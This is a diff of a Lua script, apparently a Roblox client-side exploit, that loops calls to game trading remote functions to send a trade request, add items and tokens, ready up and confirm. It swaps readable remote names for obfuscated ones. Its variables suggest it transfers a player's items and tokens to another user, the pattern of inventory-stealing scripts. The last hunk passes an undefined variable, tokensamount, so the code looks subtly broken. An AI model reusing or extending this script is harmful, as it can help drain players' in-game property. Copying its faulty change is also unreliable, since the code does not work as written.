@@ -80,7 +80,7 @@ local function sendTradeRequest(user)
     }
     repeat
         task.wait(0.1)
-        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
+        local response = netModule:WaitForChild("RF/.G65?u>/&3r=%t/9:&j?O=G{"):InvokeServer(unpack(args))
     until response == true
 end
 
@@ -90,7 +90,7 @@ local function addItemToTrade(itemType, ID)
         [2] = ID
     }
     repeat
-        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
+        local response = netModule:WaitForChild("RF/.G65?u>/s2h\"Eg;)D(w/>="):InvokeServer(unpack(args))
     until response == true
 end
 
@@ -100,14 +100,14 @@ local function readyTrade()
     }
     repeat
         task.wait(0.1)
-        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
+        local response = netModule:WaitForChild("RF/.G65?u>/%3e=JW>"):InvokeServer(unpack(args))
     until response == true
 end
 
 local function confirmTrade()
     repeat
         task.wait(0.1)
-        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+        netModule:WaitForChild("RF/.G65?u>/u=r?:t;)G5i3"):InvokeServer()
     until not inTrade
 end
 
@@ -514,7 +514,7 @@ if #itemsToSend > 0 or totalTokens > 0 then
             -- Always add tokens if available (even with no items)
             if tradeTokens > 0 then
                 local tokenSuccess, tokenError = pcall(function()
-                    netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tradeTokens)
+                    netModule:WaitForChild("RF/.G65?u>/s2h-@m3CH(t\"L98l"):InvokeServer(tokensamount)
                 end)
                 
                 if tokenSuccess then
